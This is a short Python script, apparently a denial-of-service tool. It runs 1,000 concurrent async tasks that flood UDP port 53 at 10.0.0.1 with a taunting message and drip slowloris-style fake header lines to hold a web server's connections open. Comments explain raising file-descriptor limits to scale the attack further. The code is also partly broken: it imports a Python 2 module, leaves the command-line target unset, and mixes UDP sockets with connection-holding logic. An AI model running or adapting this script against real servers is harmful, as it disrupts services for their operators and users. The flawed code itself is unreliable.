#!/usr/bin/env python3

import socket
import asyncio
import random
import sys

# Delay factor, some noise is added.
DELAY = 5
UDP_IP = '10.0.0.1'
UDP_PORT = 53
MESSAGE = 'Got you bitch!'

# Number of concurrent requests that are happening, threads are not used.
# To get this above 1024 on linux, you have to edit /etc/security/limits.conf
# and add a line like vita soft nofile 2000
# and vita hard nofile 40000
# You can check the status of these limits with ulimit -Hn and ulimit -Sn
CONCURRENT_REQUESTS = 1000

def fl():
    sys.stdout.flush()

async def hit_server(target):
    await asyncio.gather(
        *[asyncio.create_task(papercut(target, i)) for i in range(CONCURRENT_REQUESTS)]
        )

# Single thread that will keep attempting to
# send requests to the server that _will_ time out.
async def papercut(target, i):
    while True:
        soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        await asyncio.sleep(random.random()*DELAY)
        soc.connect(target)
        print('N', end='')
        fl()
        soc.sendto(bytes(MESSAGE, "utf-8"), (UDP_IP, UDP_PORT))
        await asyncio.sleep(DELAY/2)
        try:
            for v in range(20):
                print('C', end='')
                fl()
                soc.send(('adsf' + str(v) + ": 5\r\n").encode())
                await asyncio.sleep(DELAY/2 + random.random())
        except BrokenPipeError:
            print('B', end='')
            fl()
            soc.close()
if __name__ == '__main__':
    import sys
    target = None
    if len(sys.argv) == 1:
        target = ('10.0.0.1', 80)
    elif len(sys.argv) == 3:
        import urlparse
#        target =
    asyncio.run(hit_server(target))
